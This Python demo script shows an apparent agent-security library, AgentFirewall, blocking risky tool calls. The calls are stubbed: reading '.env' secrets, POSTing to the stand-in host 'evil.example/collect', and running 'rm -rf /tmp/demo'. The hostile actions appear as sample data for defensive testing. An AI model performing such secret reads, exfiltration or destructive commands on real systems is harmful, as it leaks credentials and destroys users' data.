"""Compare the same risky workflow without and with AgentFirewall."""

from __future__ import annotations

import io
import subprocess

from agentfirewall import FirewallConfig, create_firewall
from agentfirewall.approval import approve_all
from agentfirewall.exceptions import FirewallViolation
from agentfirewall.generic import create_generic_runtime_bundle
from agentfirewall.policy_packs import named_policy_pack


def _raw_shell(command: str) -> str:
    print(f"RAW shell executed: {command}")
    return "ok"


def _raw_read_file(path: str) -> str:
    print(f"RAW file read executed: {path}")
    return "SECRET=demo"


def _raw_http_request(url: str, method: str = "GET") -> str:
    print(f"RAW http request executed: {method} {url}")
    return '{"status":"ok"}'


def _fake_shell_runner(command, *, shell=False, cwd=None, **kwargs):
    return subprocess.CompletedProcess(
        args=command,
        returncode=0,
        stdout="repo files\n",
    )


def _fake_http_opener(request, **kwargs):
    return io.BytesIO(b'{"status":"ok"}')


def _fake_file_opener(path, mode="r", **kwargs):
    return io.StringIO("README CONTENT")


def run_without_firewall() -> None:
    print("== without AgentFirewall ==")
    _raw_read_file(".env")
    _raw_http_request("https://evil.example/collect", method="POST")
    _raw_shell("rm -rf /tmp/demo && echo done")


def run_with_firewall() -> None:
    print("\n== with AgentFirewall ==")
    firewall = create_firewall(
        config=FirewallConfig(name="without-vs-with"),
        policy_pack=named_policy_pack("default", trusted_hosts=("api.openai.com",)),
        approval_handler=approve_all(reason="Approved for without-vs-with demo."),
    )
    bundle = create_generic_runtime_bundle(
        firewall=firewall,
        runner=_fake_shell_runner,
        http_opener=_fake_http_opener,
        file_opener=_fake_file_opener,
        tool_call_id_factory=lambda name, args, kwargs: f"call_compare_{name}",
    )

    bundle.register_tool(
        "read_file",
        lambda path: bundle.file_access.open(path, "r").read(),
    )
    bundle.register_tool(
        "http_request",
        lambda url, method="GET": bundle.http_client.request(url, method=method).read(),
    )
    bundle.register_tool(
        "shell",
        lambda command: bundle.command_runner.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            check=False,
        ).stdout.strip(),
    )

    for label, name, kwargs in (
        ("secret read", "read_file", {"path": ".env"}),
        ("untrusted egress", "http_request", {"url": "https://evil.example/collect", "method": "POST"}),
        ("dangerous shell", "shell", {"command": "rm -rf /tmp/demo && echo done"}),
    ):
        try:
            bundle.dispatch(name, **kwargs)
            print(f"{label}: allowed")
        except FirewallViolation as exc:
            print(f"{label}: blocked -> {exc}")


def main() -> None:
    run_without_firewall()
    run_with_firewall()


if __name__ == "__main__":
    main()
